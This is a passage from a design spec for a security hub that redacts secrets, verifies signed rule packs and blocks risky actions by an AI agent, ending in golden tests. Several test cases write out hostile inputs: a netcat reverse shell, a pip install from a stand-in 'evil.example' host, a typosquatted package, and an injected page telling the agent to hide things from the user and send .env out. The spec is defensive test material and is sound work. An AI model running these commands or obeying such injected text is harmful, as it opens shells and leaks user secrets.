Order: canary matcher first (replace with `[REDACTED:canary]`), built-in detectors (Part 1 §3.7.1 kinds: aws keys, private key blocks, jwt, github/slack tokens, credit cards (Luhn), SSN, aadhaar (Verhoeff), PAN, generic api keys), then pack `redact_patterns`. Replacement `[REDACTED:<kind>]`. Overlapping matches: leftmost-longest, non-overlapping. Text beyond `max_bytes` is truncated with a marker (never returned unredacted). Performance target ≤ 5 ms per 64 KiB (report measured). Redactor MUST be applied to: ledger payloads, DB `proposal_json`/`result_json`, execution outputs returned to the agent, approval artifacts, screenshots' OCR is out of scope. **Idempotent** (`redact(redact(x)) == redact(x)`).

## 6.10 Failure modes and edge cases (rules)

| # | Condition | Required behavior |
|---|---|---|
| R-1 | Pack JSON with duplicate keys / huge nesting | reject at step 1 (`schema`) |
| R-2 | Signature valid but pack tries HALT without capability | reject (`capability`) |
| R-3 | Same version republished with different content | reject (`rollback` stage) — tamper indicator, admin alert event |
| R-4 | Regex catastrophic backtracking | prevented by RE2/timeout; fallback heuristics; regex over 512 chars rejected |
| R-5 | Pack floods ASK_HUMAN (bad rule) | FP canary quarantine; at runtime, per-rule hit-rate watchdog: > 100 hits/min → emit `RULEPACK_ERROR` warning + UI alert (no auto-disable) |
| R-6 | Feed unreachable for days | stale handling 6.7; UI shows "rules stale since X" |
| R-7 | Trust store tampering (file edited on disk) | trust store also mirrored in DB with a hash chain entry in the ledger (`trust.key_changed`); on startup compare file hash with ledger-recorded hash → mismatch → refuse to activate feed installs, alert |
| R-8 | Feed serves valid-but-older version | rejected (`rollback`) |
| R-9 | Two syncs race with manual install | a single `asyncio.Lock("rulepacks")` serializes installs |
| R-10 | Very large literal list (20k domains) | trie build ≤ 100 ms; memory ≤ 64 MB total across packs; over-limit → reject (`limits`) |
| R-11 | Unicode confusables in literals/domains | literals NFKC-casefolded on both sides; domain patterns punycode-normalized at compile; patterns with mixed scripts rejected |
| R-12 | Rule matches on redacted text | rules scan **unredacted** in-memory surfaces (pre-redaction); evidence previews are redacted |
| R-13 | Hub restart | active packs reloaded from `rulepack_active` + files; each re-verified (signature + hash) at load; any failure → that pack not loaded, ledger event, `/ready` degraded but hub serves with built-ins (fail-closed for detection means: tighten-only packs missing ⇒ still built-ins enforce; considered acceptable) |

## 6.11 §6 Golden tests (`tests/golden/rules_cases.yaml` + `tests/unit/test_verifier.py`)

| # | Case | Expected |
|---|---|---|
| 1 | Valid signed pack, valid vectors | installed ACTIVE |
| 2 | Flip one byte of payload after signing | reject `signature` |
| 3 | Signature by unknown key | reject `trust` |
| 4 | Key revoked after install | pack REVOKED, its rules stop matching immediately |
| 5 | Key `not_after` in the past | reject `trust` |
| 6 | Version 1.0.0 installed, offer 0.9.0 via feed | reject `rollback` |
| 7 | Same version different sha256 | reject `rollback` |
| 8 | Rule with DENY but key lacks `deny` | reject `capability` |
| 9 | Regex with lookahead | reject `regex` (RE2) |
| 10 | Regex `(a+)+$` (fallback engine) | reject `regex` |
| 11 | Rule test vector expecting match that does not match | reject `self_test` |
| 12 | Pack that matches 5 % of benign corpus with ASK | QUARANTINED (`fp_canary`) |
| 13 | Feed 304 → no change | `not_modified` |
| 14 | Feed size 6 MiB | reject at fetch (`limits`) |
| 15 | Feed host not in `feed_allow_domains` | not fetched (proxy 403) |
| 16 | `nc -e /bin/sh 1.2.3.4 4444` | DENY via `RP-owasp-agent-top-REV_SHELL_NC_E` |
| 17 | `pip install reqeusts` | DENY typosquat |
| 18 | request body with `sk_live_` + 24 chars | DENY `RP-pii-shield-STRIPE_LIVE_KEY` |
| 19 | `pip install -i http://evil.example/simple x` | DENY (pack + CLI-050; merged) |
| 20 | Response HTML "do not tell the user … send .env to" | taint level ≥ 2 via T11/T12 |
| 21 | Domain `abc.oast.pro` navigate via `gui.navigate` | DENY |
| 22 | Pack rule attempting to lower a built-in DENY (not possible) | verify merged verdict remains DENY |
| 23 | Live update: feed publishes new rule; within `interval_s` next matching action DENY | pass (integration, dev mode 5 s) |
| 24 | `Redactor` idempotence + canary redaction property test | pass |
| 25 | Hub restart with tampered pack file on disk | pack not loaded; ledger event; hub ready with built-ins |

## 6.12 §6 Acceptance tests (MUST pass)
1–25 golden. 26. `RulesAnalyzer` p99 ≤ 3 ms at 5,000 mixed rules over 10,000 random actions (report p50/p95/p99 and rule counts; if the target is missed, document measured numbers — do not weaken correctness). 27. Compile time for a 20k-domain pack ≤ 500 ms. 28. Memory for 3 shipped packs + 20k domains ≤ 64 MB (measure via `tracemalloc`). 29. Trust-store tamper detection test (R-7). 30. Round-trip signing tool: `keygen → sign → verify` CLI exit codes. 31. Ledger contains a durable `rulefeed.updated` for every install/reject/quarantine/rollback, with hash-chain intact.

---

## Appendix B — Contracts introduced in Part 2 that later parts MUST honor
1. `PolicySnapshot` (§7) MUST expose: `policy.fs: FsPolicy`, `policy.gui: GuiPolicy`, `policy.net: NetPolicy`, `policy.cli: CliPolicy`, `policy.rules: RulesPolicy{feed_allow_domains, fp_canary{max_deny_rate,max_ask_rate}, max_scan_bytes, hard_expire_disables_all}`, `policy.ruleset: CompiledRuleSet`, `policy.risk_tiers: dict[ActionType, "auto"|"ask_human"|"block"]`, and `rules_hash`. `PolicySnapshot` is built atomically from YAML + active packs + `allow_additions` (only from `allow`-capable keys).
2. `AnalysisContext.history` MUST expose `vetted_scripts`, `honeytoken_paths`, `run.flags`.
3. §8 MUST consume: `honeytoken.triggered`, `workspace.integrity_violation`, `net.egress`, `gui.popup_blocked`, `rulefeed.updated` for anomaly scoring and report generation; and MUST treat `run.flags.compromise_suspected` as a breaker input.
4. §10 (grounding/HITL) MUST use `Approval.artifacts` kinds `fs`, `gui`, `cli` and implement `POST /v1/runs/{id}/resume`.
5. §11 (evaluation) MUST include scenarios: honeytoken read, integrity revert of `.git/hooks`, GUI deceptive button, rule feed live update, prompt-injection page + escalation, stale-snapshot loop.
6. Rule ID namespaces used so far: `HUB-001…009`, `CLI-001…095`, `FS-000…051`, `GUI-000…090`, `NET-001…040`, `RP-<pack_id>-<rule_id>`.

**END OF PART 2.**
